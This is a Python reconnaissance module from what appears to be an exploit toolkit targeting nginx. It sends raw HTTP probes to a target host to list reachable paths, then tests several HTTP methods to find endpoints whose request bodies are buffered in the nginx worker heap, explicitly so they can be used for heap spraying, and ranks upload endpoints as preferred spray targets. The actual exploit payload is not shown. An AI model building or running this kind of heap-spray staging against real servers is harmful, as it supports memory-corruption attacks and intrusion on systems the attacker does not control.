"""
recon/endpoints.py — Path discovery for interesting endpoints.
"""
from __future__ import annotations

import socket

from config import INTERESTING_PATHS, REALISTIC_SPRAY_PATHS
from core.spray import wrap_if_ssl


def path_discovery(host: str, port: int, vhost: str = "l",
                   use_ssl: bool = False) -> dict:
    """Probe interesting paths and collect status codes."""
    found = []
    for path in INTERESTING_PATHS:
        try:
            sock = socket.create_connection((host, port), timeout=3)
            with wrap_if_ssl(sock, host, use_ssl) as s:
                s.sendall(
                    f"GET {path} HTTP/1.1\r\nHost:{vhost}\r\nConnection:close\r\n\r\n".encode()
                )
                data = s.recv(256)
                status = data.split(b"\r\n", 1)[0].decode("latin-1", "replace")
                found.append({"path": path, "status": status})
        except OSError:
            pass
    return {"paths_found": found}


def _accepts_body(resp: bytes) -> bool:
    """True if the status line indicates the location matched and buffered
    the request body — including 502/503, which a proxy_pass location
    returns *after* buffering when its upstream is unreachable."""
    status_line = resp.split(b"\r\n", 1)[0]
    if any(code in status_line for code in (b"404", b"405", b"403")):
        return False
    return any(code in status_line for code in (
        b"200", b"201", b"204", b"301", b"302", b"307", b"502", b"503", b"504",
    )) or b"Allow:" in resp


def discover_spray_endpoints(host: str, port: int, vhost: str = "l",
                             use_ssl: bool = False) -> list[str]:
    """Discover endpoints that accept requests for heap spraying.

    Probes each path with multiple HTTP methods (OPTIONS, POST, PUT,
    PATCH, DELETE). Any non-4xx/5xx response means the path is live
    and will buffer the request body in the nginx worker heap.
    """
    METHODS: list[bytes] = [b"OPTIONS", b"POST", b"PUT", b"PATCH", b"DELETE"]
    valid = []
    for path in REALISTIC_SPRAY_PATHS:
        alive = False
        for method in METHODS:
            if alive:
                break
            try:
                sock = socket.create_connection((host, port), timeout=2)
                with wrap_if_ssl(sock, host, use_ssl) as s:
                    s.sendall(
                        method + b" " + path.encode() + b" HTTP/1.1\r\n"
                        b"Host:" + vhost.encode() + b"\r\n"
                        b"Content-Length: 0\r\n"
                        b"Connection:close\r\n\r\n"
                    )
                    resp = s.recv(512)
                    # Accept any non-error response as proof the path is live.
                    # 502/503 means proxy_pass buffered the body before failing
                    status_line = resp.split(b"\r\n", 1)[0]
                    if not any(code in status_line for code in (b"404", b"405", b"403")):
                        valid.append(path)
                        alive = True
            except OSError:
                pass
    return valid


def select_best_spray_endpoint(host: str, port: int, vhost: str = "l",
                              use_ssl: bool = False) -> str:
    """Find the best endpoint for spraying, defaulting to /spray."""
    endpoints = discover_spray_endpoints(host, port, vhost, use_ssl)
    if not endpoints:
        return "/spray"
    if "/spray" in endpoints:
        return "/spray"
    # Prefer /upload or /api/upload as they often have larger buffers
    for pref in ["/upload", "/api/upload", "/api/v1/upload"]:
        if pref in endpoints:
            return pref
    return endpoints[0]

